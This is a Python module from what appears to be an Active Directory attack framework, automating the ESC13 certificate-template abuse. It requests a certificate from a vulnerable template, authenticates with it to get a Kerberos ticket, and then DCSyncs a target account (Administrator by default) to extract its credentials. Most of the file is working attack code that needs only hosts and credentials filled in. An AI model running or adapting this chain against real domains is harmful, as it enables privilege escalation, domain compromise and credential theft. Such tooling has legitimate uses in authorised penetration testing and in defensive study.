import os

from pathlib import Path
from tool import Tool
from module import BaseModule

class ADCSESC13(BaseModule):
    name = "ADCS - ESC13"
    path = "adcs/esc13"
    description = "ESC13: Issuance Policy with Privileged Group Linked"
    info = """A certificate template is configured with an issuance policy that has an Object Identifier (OID) linked to an Active Directory group via the msDS-OIDToGroupLink attribute. When a user authenticates with a certificate issued from this template, they are effectively granted the permissions of the linked group, even if they are not an actual member. This is a intended feature (often related to Microsoft's Authentication Mechanism Assurance - AMA) that can be abused if low-privileged users can enroll 39.

Prerequisites:
  - The attacker has enrollment rights on the vulnerable certificate template.
  - The certificate template has an issuance policy extension.
  - The certificate template defines an Extended Key Usage (EKU) that enables client authentication.
  - Has no issuance requirements the attacker cannot meet (e.g., authorized signatures).
  - The issuance policy (OID) is linked via the msDS-OIDToGroupLink attribute to an Active Directory group. This group must be empty and have universal group scope.
"""
    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "", "description": "ESC13 vulnerable template", "required": False},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise (this can be the DC$)", "required": False},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        pfx = self.uniq_filename(self.opts.target_account)
    
        tool.title("Request a certificate from the ESC13-vulnerable template")    
        if not await tool.certipy_req(['-template', self.opts.template, '-out', pfx]):
            return

        tgt = Path(f"{self.opts.username}.ccache")
        if tgt.exists():
            tgt.unlink()

        tool.title("Authenticate with the obtained certificate to get a TGT")
        if not await tool.certipy_auth(pfx, []):
            return
        
        if not tgt.exists():
            return

        tool.title("DCSync TARGET account using the obtained TGT")
        if not tool.set_auth(auth="krb", domain=self.opts.domain, username=self.opts.target_account, ticket=str(tgt)):
            return
        dcsync_res = await tool.dcsync(self.opts.target_account)

        if len(dcsync_res):
            self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
